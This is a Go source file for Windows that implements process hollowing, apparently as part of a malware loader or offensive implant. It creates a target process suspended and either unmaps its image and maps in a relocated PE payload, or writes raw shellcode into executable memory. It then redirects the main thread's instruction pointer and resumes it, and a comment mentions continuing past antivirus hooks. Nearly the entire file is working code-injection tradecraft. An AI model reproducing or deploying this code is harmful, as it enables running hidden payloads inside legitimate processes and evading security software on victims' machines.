//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── Thread CONTEXT wrapper (AMD64, 1232 bytes, 16-byte aligned) ─────────────

type x64Context struct {
	buf [1232 + 16]byte
	ptr uintptr
}

func newContext() *x64Context {
	c := &x64Context{}
	addr := uintptr(unsafe.Pointer(&c.buf[0]))
	if addr&15 != 0 {
		addr = (addr + 15) &^ 15
	}
	c.ptr = addr
	return c
}

func (c *x64Context) raw() uintptr { return c.ptr }

func (c *x64Context) setContextFlags(f uint32) {
	*(*uint32)(unsafe.Pointer(c.ptr + 48)) = f
}

func (c *x64Context) rip() uint64  { return *(*uint64)(unsafe.Pointer(c.ptr + 248)) }
func (c *x64Context) setRip(v uint64) { *(*uint64)(unsafe.Pointer(c.ptr + 248)) = v }

const contextAll uint32 = 0x0010001F

// ─── PROCESS_BASIC_INFORMATION ────────────────────────────────────────────────
//
// NtQueryInformationProcess(ProcessBasicInformation=0) layout on AMD64:
//   0x00  ExitStatus    uintptr
//   0x08  PebBaseAddress uintptr
//   0x10  AffinityMask  uintptr
//   0x18  BasePriority  uintptr
//   0x20  UniqueProcessId uintptr
//   0x28  InheritedFromUniqueProcessId uintptr

type processBasicInfo struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 uintptr
	UniqueProcessId              uintptr
	InheritedFromUniqueProcessId uintptr
}

// ─── Public API ───────────────────────────────────────────────────────────────

// HollowProcess selects the appropriate technique:
//   - payload starts with MZ → true PE hollowing (NtUnmapViewOfSection + relocate + PEB patch)
//   - otherwise            → shellcode hollow (RIP redirect only, kept for compat)
func HollowProcess(exe string, payload []byte) error {
	if len(payload) >= 2 && payload[0] == 0x4D && payload[1] == 0x5A {
		return hollowPE(exe, payload)
	}
	return hollowShellcode(exe, payload)
}

// ─── True PE Hollowing ────────────────────────────────────────────────────────
//
// Steps:
//  1. Parse payload PE headers.
//  2. CreateProcess(exe, CREATE_SUSPENDED).
//  3. NtQueryInformationProcess → PebBaseAddress.
//  4. Read remote PEB.ImageBaseAddress (PEB+0x10).
//  5. NtUnmapViewOfSection to unmap original image.
//  6. VirtualAllocEx at payload.ImageBase (or anywhere on fail).
//  7. Copy headers + sections into a local staging buffer.
//  8. Apply base relocations to staging buffer.
//  9. WriteProcessMemory → remote.
// 10. Patch remote PEB.ImageBaseAddress.
// 11. GetThreadContext, setRip, SetThreadContext.
// 12. ResumeThread.

func hollowPE(exe string, payload []byte) error {
	if len(payload) < 0x40 {
		return fmt.Errorf("hollow: payload too small")
	}

	// ── 1. Parse payload PE ───────────────────────────────────────────────
	if binary.LittleEndian.Uint16(payload[0:2]) != 0x5A4D {
		return fmt.Errorf("hollow: invalid MZ signature in payload")
	}
	peOff := binary.LittleEndian.Uint32(payload[0x3C:])
	if binary.LittleEndian.Uint32(payload[peOff:]) != 0x00004550 {
		return fmt.Errorf("hollow: invalid PE signature")
	}
	if binary.LittleEndian.Uint16(payload[peOff+4:]) != 0x8664 {
		return fmt.Errorf("hollow: only AMD64 PE supported")
	}

	optOff := peOff + 24
	if binary.LittleEndian.Uint16(payload[optOff:]) != 0x020B {
		return fmt.Errorf("hollow: only PE32+ supported")
	}

	numSections := binary.LittleEndian.Uint16(payload[peOff+6:])
	imageBase := binary.LittleEndian.Uint64(payload[optOff+24:])
	sizeOfImage := binary.LittleEndian.Uint32(payload[optOff+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optOff+60:])
	entryPointRVA := binary.LittleEndian.Uint32(payload[optOff+16:])
	relocRVA := binary.LittleEndian.Uint32(payload[optOff+128:])
	relocSize := binary.LittleEndian.Uint32(payload[optOff+132:])
	secTableOff := uint32(optOff) + 240 // PE32+ opt hdr = 240 bytes

	// ── 2. Create target process suspended ────────────────────────────────
	exeW, err := windows.UTF16PtrFromString(exe)
	if err != nil {
		return fmt.Errorf("hollow: UTF16Ptr: %w", err)
	}
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	if err := windows.CreateProcess(exeW, nil, nil, nil, false,
		windows.CREATE_SUSPENDED, nil, nil, &si, &pi); err != nil {
		return fmt.Errorf("hollow: CreateProcess(%s): %w", exe, err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	abort := func(msg string, e error) error {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("hollow: %s: %w", msg, e)
	}

	// ── 3. Get PEB address ────────────────────────────────────────────────
	var pbi processBasicInfo
	var retLen uint32
	r, _, _ := procNtQueryInformationProcess.Call(
		uintptr(pi.Process),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if r != 0 {
		return abort("NtQueryInformationProcess", fmt.Errorf("NTSTATUS 0x%08X", uint32(r)))
	}

	// ── 4. Read remote PEB.ImageBaseAddress (PEB+0x10) ───────────────────
	var remoteImageBase uintptr
	if err := windows.ReadProcessMemory(pi.Process,
		pbi.PebBaseAddress+0x10,
		(*byte)(unsafe.Pointer(&remoteImageBase)),
		unsafe.Sizeof(remoteImageBase), nil); err != nil {
		return abort("ReadProcessMemory(PEB.ImageBase)", err)
	}

	// ── 5. NtUnmapViewOfSection ───────────────────────────────────────────
	r, _, _ = procNtUnmapViewOfSection.Call(uintptr(pi.Process), remoteImageBase)
	if r != 0 {
		// Non-fatal on some targets: continue and rely on alloc overwriting.
		_ = r
	}

	// ── 6. Allocate in remote process via direct NT syscall ───────────────
	// ntAllocAt tries the preferred image base first, falls back to OS-chosen.
	allocBase, err := ntAllocAt(pi.Process, uintptr(imageBase), uintptr(sizeOfImage), pageExecuteReadWrite)
	if err != nil {
		return abort("NtAllocateVirtualMemory", err)
	}

	// ── 7. Build staging buffer (local copy) ──────────────────────────────
	staging := make([]byte, sizeOfImage)

	// Copy headers.
	copy(staging[:sizeOfHeaders], payload[:sizeOfHeaders])

	// Copy sections.
	for i := 0; i < int(numSections); i++ {
		off := secTableOff + uint32(i)*40
		sec := payload[off:]
		virtualAddr := binary.LittleEndian.Uint32(sec[12:])
		rawOff := binary.LittleEndian.Uint32(sec[20:])
		rawSize := binary.LittleEndian.Uint32(sec[16:])
		virtSize := binary.LittleEndian.Uint32(sec[8:])
		if rawSize == 0 {
			continue
		}
		copyLen := rawSize
		if copyLen > virtSize {
			copyLen = virtSize
		}
		copy(staging[virtualAddr:virtualAddr+copyLen], payload[rawOff:rawOff+copyLen])
	}

	// ── 8. Apply base relocations to staging buffer ───────────────────────
	delta := int64(allocBase) - int64(imageBase)
	if delta != 0 && relocRVA != 0 && relocSize != 0 {
		hollowApplyRelocs(staging, relocRVA, relocSize, delta)
	}

	// ── 9. Write staging buffer → remote ─────────────────────────────────
	var written uintptr
	if err := windows.WriteProcessMemory(pi.Process, allocBase,
		&staging[0], uintptr(sizeOfImage), &written); err != nil {
		return abort("WriteProcessMemory(image)", err)
	}

	// ── 10. Patch remote PEB.ImageBaseAddress ────────────────────────────
	if err := windows.WriteProcessMemory(pi.Process,
		pbi.PebBaseAddress+0x10,
		(*byte)(unsafe.Pointer(&allocBase)),
		unsafe.Sizeof(allocBase), nil); err != nil {
		// Non-fatal: some AV hooks here; log and continue.
		_ = err
	}

	// ── 11. Redirect main thread RIP to new entry point ──────────────────
	ctx := newContext()
	ctx.setContextFlags(contextAll)
	r, _, e := procGetThreadContext.Call(uintptr(pi.Thread), ctx.raw())
	if r == 0 {
		return abort("GetThreadContext", fmt.Errorf("%v", e))
	}
	ctx.setRip(uint64(allocBase) + uint64(entryPointRVA))
	r, _, e = procSetThreadContext.Call(uintptr(pi.Thread), ctx.raw())
	if r == 0 {
		return abort("SetThreadContext", fmt.Errorf("%v", e))
	}

	// ── 12. Resume ────────────────────────────────────────────────────────
	procResumeThread.Call(uintptr(pi.Thread))
	return nil
}

// hollowApplyRelocs patches IMAGE_BASE_RELOCATION blocks in staging.
func hollowApplyRelocs(staging []byte, relocRVA, relocSize uint32, delta int64) {
	off := uintptr(relocRVA)
	end := off + uintptr(relocSize)
	for off < end {
		if int(off+8) > len(staging) {
			break
		}
		pageRVA := binary.LittleEndian.Uint32(staging[off:])
		blockSize := binary.LittleEndian.Uint32(staging[off+4:])
		if blockSize < 8 {
			break
		}
		numEntries := (blockSize - 8) / 2
		for i := uint32(0); i < numEntries; i++ {
			entry := binary.LittleEndian.Uint16(staging[off+8+uintptr(i)*2:])
			if entry>>12 != 10 { // IMAGE_REL_BASED_DIR64
				continue
			}
			patchOff := uintptr(pageRVA) + uintptr(entry&0x0FFF)
			if int(patchOff+8) > len(staging) {
				continue
			}
			old := int64(binary.LittleEndian.Uint64(staging[patchOff:]))
			binary.LittleEndian.PutUint64(staging[patchOff:], uint64(old+delta))
		}
		off += uintptr(blockSize)
	}
}

// ─── Shellcode hollow (RIP redirect, legacy) ──────────────────────────────────
//
// Creates a suspended process and injects raw shellcode by patching the main
// thread's RIP — no PE parsing, no unmapping.  Use when payload is raw shellcode.

func hollowShellcode(exe string, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	exeW, err := windows.UTF16PtrFromString(exe)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString: %w", err)
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	if err := windows.CreateProcess(exeW, nil, nil, nil, false,
		windows.CREATE_SUSPENDED, nil, nil, &si, &pi); err != nil {
		return fmt.Errorf("CreateProcess(%s): %w", exe, err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	addr, err := ntAlloc(pi.Process, uintptr(len(shellcode)), pageExecuteReadWrite)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}

	var written uintptr
	if err := windows.WriteProcessMemory(pi.Process, addr,
		&shellcode[0], uintptr(len(shellcode)), &written); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}

	ctx := newContext()
	ctx.setContextFlags(contextAll)
	r, _, e2 := procGetThreadContext.Call(uintptr(pi.Thread), ctx.raw())
	if r == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("GetThreadContext: %v", e2)
	}
	ctx.setRip(uint64(addr))
	r, _, e2 = procSetThreadContext.Call(uintptr(pi.Thread), ctx.raw())
	if r == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("SetThreadContext: %v", e2)
	}

	procResumeThread.Call(uintptr(pi.Thread))
	return nil
}
